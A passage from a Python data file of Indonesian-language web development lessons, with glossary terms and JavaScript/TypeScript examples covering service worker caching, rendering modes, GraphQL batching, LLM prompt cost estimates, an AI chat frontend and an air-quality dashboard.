      b.onclick = () => { this.setAttribute("nilai", i); this.dispatchEvent(new CustomEvent("ubah", { detail: i, bubbles: true })); };
      wadah.append(b);
    }
  }
}
customElements.define("rating-bintang", RatingBintang);
</script>''', lang='html')]),

'PWA & service worker': dict(
  ist=[('PWA', 'Progressive Web App: web yang bisa dipasang, berjalan offline, dan mengirim notifikasi.'),
       ('Web App Manifest', 'manifest.webmanifest berisi nama, ikon, warna, dan mode tampilan.'),
       ('Service worker', 'Script di latar belakang yang mencegat request jaringan.'),
       ('Cache strategy', 'Cache first, network first, stale-while-revalidate.'),
       ('Workbox', 'Pustaka Google untuk membuat service worker dengan strategi siap pakai.')],
  cx=[X('Service worker dengan tiga strategi cache', r'''
// sw.js
const VERSI = "v3";
const APP_SHELL = ["/", "/app.css", "/app.js", "/offline.html"];

self.addEventListener("install", (e) => e.waitUntil(caches.open(VERSI).then((c) => c.addAll(APP_SHELL))));
self.addEventListener("activate", (e) =>
  e.waitUntil(caches.keys().then((ks) => Promise.all(ks.filter((k) => k !== VERSI).map((k) => caches.delete(k))))));

self.addEventListener("fetch", (e) => {
  const url = new URL(e.request.url);
  if (url.pathname.startsWith("/api/")) {                       // network first
    e.respondWith(fetch(e.request).then((r) => { caches.open(VERSI).then((c) => c.put(e.request, r.clone())); return r; })
      .catch(() => caches.match(e.request)));
  } else if (e.request.destination === "image") {               // cache first
    e.respondWith(caches.match(e.request).then((c) => c ?? fetch(e.request)));
  } else {                                                      // stale-while-revalidate
    e.respondWith(caches.match(e.request).then((c) => {
      const jaringan = fetch(e.request).then((r) => { caches.open(VERSI).then((ca) => ca.put(e.request, r.clone())); return r; })
        .catch(() => caches.match("/offline.html"));
      return c ?? jaringan;
    }));
  }
});

// main.js
if ("serviceWorker" in navigator) navigator.serviceWorker.register("/sw.js");''', lang='js'),
      J('Simulasi strategi saat online dan offline', r'''
async function jaringan(url, online) { if (!online) throw new Error("offline"); return `${url} versi terbaru`; }
const buatStrategi = (cache) => ({
  "network first": async (u, on) => { try { const r = await jaringan(u, on); cache.set(u, r + " (tersimpan)"); return r; } catch { return cache.get(u) ?? "offline.html"; } },
  "cache first": async (u, on) => cache.get(u) ?? jaringan(u, on).then((r) => (cache.set(u, r + " (tersimpan)"), r)).catch(() => "offline.html"),
});
for (const nama of ["network first", "cache first"]) {
  const cache = new Map([["/api/jadwal", "/api/jadwal versi kemarin (tersimpan)"]]);
  const f = buatStrategi(cache)[nama];
  console.log(`== ${nama}`);
  for (const online of [true, false])
    for (const u of ["/api/jadwal", "/logo.png"]) console.log(`  ${online ? "online " : "offline"} ${u.padEnd(12)} -> ${await f(u, online)}`);
}
console.log("network first: data selalu terbaru saat online; cache first: cepat, tapi /api/jadwal tetap versi kemarin.");
''')]),

'CSR, SSR & SSG': dict(
  ist=[('CSR', 'Client-Side Rendering: HTML kosong, JavaScript merender di browser.'),
       ('SSR', 'Server-Side Rendering: HTML dibuat per request.'),
       ('SSG', 'Static Site Generation: HTML dibuat saat build.'),
       ('ISR', 'Incremental Static Regeneration: halaman statis diperbarui berkala.'),
       ('Hydration cost', 'Biaya JavaScript untuk membuat HTML server menjadi interaktif.')],
  cx=[J('Tiga cara menghasilkan HTML yang sama', r'''
const produk = [{ nama: "Kopi Gayo", harga: 65000 }, { nama: "Teh Melati", harga: 18000 }];
const templat = (d) => `<ul>${d.map((p) => `<li>${p.nama} - Rp${p.harga.toLocaleString("id-ID")}</li>`).join("")}</ul>`;

const csr = `<div id="root"></div><script src="/bundle.js"></script>`;      // isi dibuat browser
const ssrPerRequest = (req) => `<!-- dibuat ${req} -->` + templat(produk);
const ssgSaatBuild = templat(produk);                                          // dibuat sekali

console.log("CSR  HTML dikirim :", csr);
console.log("SSR  request #1   :", ssrPerRequest("request 1"));
console.log("SSR  request #2   :", ssrPerRequest("request 2"), "(dihitung ulang)");
console.log("SSG  semua request:", ssgSaatBuild);
console.log("\nApa yang dilihat crawler tanpa JS?");
for (const [n, h] of [["CSR", csr], ["SSR", ssrPerRequest("bot")], ["SSG", ssgSaatBuild]])
  console.log(` ${n}: ${h.includes("Kopi Gayo") ? "melihat produk" : "halaman kosong"}`);
''')]),

'GraphQL': dict(
  ist=[('Schema & type', 'Kontrak data di server: type Produk { id: ID!, nama: String! }.'),
       ('Query / Mutation / Subscription', 'Baca, ubah, dan langganan data real-time.'),
       ('Over-fetching / under-fetching', 'Masalah REST yang dijawab GraphQL: klien meminta field yang tepat.'),
       ('N+1 problem', 'Resolver memanggil DB per item; diatasi dengan DataLoader (batching).'),
       ('Apollo Client / urql / Relay', 'Klien GraphQL dengan cache normalisasi.')],
  cx=[J('Server GraphQL mini: resolver dan pemilihan field', r'''
const db = {
  produk: [{ id: 1, nama: "Kopi Gayo", harga: 65000, tokoId: 10 }, { id: 2, nama: "Teh Melati", harga: 18000, tokoId: 11 }, { id: 3, nama: "Kopi Toraja", harga: 72000, tokoId: 10 }],
  toko: [{ id: 10, nama: "Kopi Nusantara", kota: "Medan" }, { id: 11, nama: "Teh Jawa", kota: "Solo" }],
};
let queryDb = 0;
const ambilTokoBatch = (ids) => { queryDb++; return ids.map((id) => db.toko.find((t) => t.id === id)); };

function jalankan(seleksi, batching) {
  queryDb = 1;  // query produk
  const tokoIds = [...new Set(db.produk.map((p) => p.tokoId))];
  const tokoMap = batching ? new Map(ambilTokoBatch(tokoIds).map((t) => [t.id, t])) : null;
  return db.produk.map((p) => Object.fromEntries(seleksi.map((f) => {
    if (typeof f === "string") return [f, p[f]];
    const toko = batching ? tokoMap.get(p.tokoId) : ambilTokoBatch([p.tokoId])[0];
    return [f.toko[0] === "*" ? "toko" : "toko", Object.fromEntries(f.toko.map((k) => [k, toko[k]]))];
  })));
}
// query { produk { nama harga toko { nama } } }
const seleksi = ["nama", "harga", { toko: ["nama"] }];
console.log(JSON.stringify(jalankan(seleksi, false)));
console.log("tanpa DataLoader:", queryDb, "query DB (N+1)");
jalankan(seleksi, true);
console.log("dengan DataLoader:", queryDb, "query DB");
'''),
      X('Query dan mutation dari klien', r'''
query KatalogKopi($kat: String!, $after: String) {
  produk(kategori: $kat, first: 12, after: $after) {
    edges { node { id nama harga gambar(lebar: 400) toko { nama kota } } }
    pageInfo { hasNextPage endCursor }
  }
}

mutation TambahKeranjang($id: ID!, $qty: Int = 1) {
  tambahKeranjang(produkId: $id, qty: $qty) { id jumlahItem total }
}''', lang='graphql')]),

'LLM & asisten coding': dict(
  ist=[('LLM', 'Large Language Model: model yang memprediksi token berikutnya dari konteks.'),
       ('Token & context window', 'Satuan teks yang diproses; batas berapa banyak teks bisa dibaca sekaligus.'),
       ('Hallucination', 'Jawaban meyakinkan yang salah; selalu verifikasi kode dan API yang disarankan.'),
       ('Coding agent', 'Asisten yang membaca repo, menjalankan perintah, dan membuat perubahan (Claude Code, Copilot, Cursor).'),
       ('Prompt dengan konteks', 'Sertakan tujuan, batasan, contoh, dan kriteria selesai.')],
  cx=[J('Memperkirakan token dan biaya prompt', r'''
// perkiraan kasar: ~4 karakter per token untuk teks Inggris, ~3 untuk Indonesia/kode campuran
const kiraToken = (s, cpt = 3.2) => Math.ceil(s.length / cpt);
const promptBuruk = "buatin komponen tabel";
const promptBaik = `Buat komponen React TypeScript <TabelPesanan> untuk dasbor toko.
Konteks: data dari useQuery(["pesanan"]), tipe Pesanan { id, tanggal, pelanggan, total, status }.
Wajib: urut per kolom, paginasi 20 baris, status sebagai badge berwarna, empty & loading state, aksesibel (th scope, aria-sort).
Gaya: Tailwind, ikuti komponen Tombol di src/shared/Tombol.tsx.
Selesai bila: lulus tsc --noEmit dan tes Vitest untuk pengurutan.`;
for (const [n, p] of [["prompt singkat", promptBuruk], ["prompt lengkap", promptBaik]])
  console.log(`${n.padEnd(15)} ~${String(kiraToken(p)).padStart(4)} token`);
const tokenRepo = 180_000, harga = { input: 3, output: 15 };   // USD per 1 juta token (ilustrasi)
const biaya = (tokenRepo * harga.input + 4_000 * harga.output) / 1e6;
console.log(`Membaca ${tokenRepo.toLocaleString("id-ID")} token konteks + 4.000 token jawaban ≈ $${biaya.toFixed(2)} per permintaan`);
''', 'Prompt yang lebih panjang tetapi jelas biasanya lebih murah secara total karena mengurangi bolak-balik revisi.')]),

'Membangun fitur AI di frontend': dict(
  ist=[('Streaming response', 'Jawaban model dikirim bertahap (SSE) agar pengguna melihat teks langsung muncul.'),
       ('Server-side API key', 'Kunci API hanya di server/route handler, tidak pernah di bundle klien.'),
       ('Vercel AI SDK', 'Pustaka populer untuk chat, streaming, dan tool calling di React/Next.js.'),
       ('Guardrail & rate limit', 'Batas panjang input, jumlah permintaan per pengguna, dan penyaringan konten.'),
       ('AI UX', 'Tampilkan status, tombol stop, salin, dan beri tahu bahwa jawaban bisa keliru.')],
  cx=[J('Membaca stream Server-Sent Events seperti chat AI', r'''
import http from "node:http";
const jawaban = "Untuk kopi V60, pakai rasio 1:15, air 92°C, dan waktu seduh sekitar 3 menit.".split(" ");
const server = http.createServer(async (req, res) => {
  res.writeHead(200, { "content-type": "text/event-stream", "cache-control": "no-cache" });
  for (const kata of jawaban) { res.write(`data: ${JSON.stringify({ teks: kata + " " })}\n\n`); await new Promise((r) => setTimeout(r, 5)); }
  res.end("data: [DONE]\n\n");
});
await new Promise((r) => server.listen(0, r));

const r = await fetch(`http://localhost:${server.address().port}/api/chat`, { method: "POST" });
const reader = r.body.pipeThrough(new TextDecoderStream()).getReader();
let sisa = "", tampil = "", potongan = 0;
while (true) {
  const { value, done } = await reader.read(); if (done) break;
  sisa += value;
  const event = sisa.split("\n\n"); sisa = event.pop();
  for (const e of event) {
    const data = e.replace(/^data: /, "");
    if (data === "[DONE]") continue;
    tampil += JSON.parse(data).teks; potongan++;
  }
}
console.log(`${potongan} potongan diterima -> "${tampil.trim()}"`);
server.close();
'''),
      X('Route handler dan komponen chat dengan Vercel AI SDK', r'''
// app/api/chat/route.ts  (API key aman di server)
import { anthropic } from "@ai-sdk/anthropic";
import { streamText } from "ai";
export async function POST(req: Request) {
  const { messages } = await req.json();
  if (JSON.stringify(messages).length > 20_000) return new Response("Terlalu panjang", { status: 413 });
  const result = streamText({ model: anthropic("claude-sonnet-5-5"), system: "Kamu asisten barista toko kopi. Jawab ringkas dalam bahasa Indonesia.", messages });
  return result.toUIMessageStreamResponse();
}

// app/chat/page.tsx
"use client";
import { useChat } from "@ai-sdk/react";
export default function Chat() {
  const { messages, sendMessage, status, stop } = useChat();
  return (
    <>
      {messages.map((m) => <p key={m.id}><b>{m.role === "user" ? "Kamu" : "Barista AI"}:</b> {m.parts.map((p) => p.type === "text" ? p.text : "").join("")}</p>)}
      {status === "streaming" && <button onClick={stop}>Hentikan</button>}
      <form onSubmit={(e) => { e.preventDefault(); const f = new FormData(e.currentTarget); sendMessage({ text: String(f.get("q")) }); e.currentTarget.reset(); }}>
        <input name="q" placeholder="Tanya soal seduh kopi..." />
      </form>
      <small>Jawaban AI bisa keliru. Periksa kembali informasi penting.</small>
    </>
  );
}''', lang='tsx')]),

'Dashboard cuaca & kualitas udara': dict(
  ist=[('AQI / ISPU', 'Indeks kualitas udara; Indonesia memakai ISPU (KLHK) dengan kategori Baik sampai Berbahaya.'),
       ('PM2.5', 'Partikel halus ≤ 2,5 mikrometer; polutan utama di kota besar.'),
       ('Open-Meteo', 'API cuaca dan kualitas udara gratis tanpa kunci API.'),
       ('Geolocation API', 'Mengambil lokasi pengguna dengan izin; sediakan input kota sebagai cadangan.'),
       ('Data visualization', 'Grafik garis untuk tren, warna kategori untuk status.')],
  cx=[J('Mengolah data per jam menjadi ringkasan dasbor', r'''
const rng = (s => () => (s = (s * 16807) % 2147483647) / 2147483647)(7);
const jam = Array.from({ length: 24 }, (_, h) => ({
  jam: h,
  suhu: +(28 + 4 * Math.sin(((h - 9) / 24) * 2 * Math.PI) + rng()).toFixed(1),
  pm25: Math.round(35 + 30 * Math.sin(((h - 3) / 24) * 2 * Math.PI) + rng() * 10),
}));
const kategori = (pm) => pm <= 15.5 ? ["Baik", "🟢"] : pm <= 55.4 ? ["Sedang", "🟡"] : pm <= 150.4 ? ["Tidak sehat", "🟠"] : ["Sangat tidak sehat", "🔴"];
const suhu = jam.map((d) => d.suhu), pm = jam.map((d) => d.pm25);
const rata = (a) => a.reduce((x, y) => x + y, 0) / a.length;
console.log(`Jakarta, hari ini: ${Math.min(...suhu)}°C sampai ${Math.max(...suhu)}°C`);
const [kat, ikon] = kategori(rata(pm));
console.log(`PM2.5 rata-rata ${rata(pm).toFixed(1)} µg/m³  ${ikon} ${kat}`);
const terbaik = jam.reduce((a, b) => (b.pm25 < a.pm25 ? b : a));
console.log(`Waktu terbaik olahraga luar ruang: pukul ${String(terbaik.jam).padStart(2, "0")}:00 (PM2.5 ${terbaik.pm25})`);
console.log("Tren PM2.5 (tiap 3 jam):");
for (const d of jam.filter((d) => d.jam % 3 === 0)) console.log(`  ${String(d.jam).padStart(2, "0")}:00 ${"▇".repeat(Math.round(d.pm25 / 4)).padEnd(20)} ${d.pm25} ${kategori(d.pm25)[1]}`);
'''),
      X('Mengambil data dari Open-Meteo dengan penanganan error', r'''
async function ambilCuaca(lat: number, lon: number, signal?: AbortSignal) {
  const u = new URL("https://api.open-meteo.com/v1/forecast");
  u.search = new URLSearchParams({ latitude: String(lat), longitude: String(lon), hourly: "temperature_2m,precipitation_probability", timezone: "Asia/Jakarta", forecast_days: "1" }).toString();
  const a = new URL("https://air-quality-api.open-meteo.com/v1/air-quality");
  a.search = new URLSearchParams({ latitude: String(lat), longitude: String(lon), hourly: "pm2_5,pm10", timezone: "Asia/Jakarta" }).toString();
  const [r1, r2] = await Promise.all([fetch(u, { signal }), fetch(a, { signal })]);
  if (!r1.ok || !r2.ok) throw new Error("Layanan cuaca sedang tidak tersedia");
  return { cuaca: await r1.json(), udara: await r2.json() };
}

navigator.geolocation.getCurrentPosition(
  (p) => muat(p.coords.latitude, p.coords.longitude),
  () => muat(-6.2088, 106.8456),            // izin ditolak: pakai Jakarta, tampilkan input kota
  { timeout: 8000 },
);''', lang='ts')]),
}
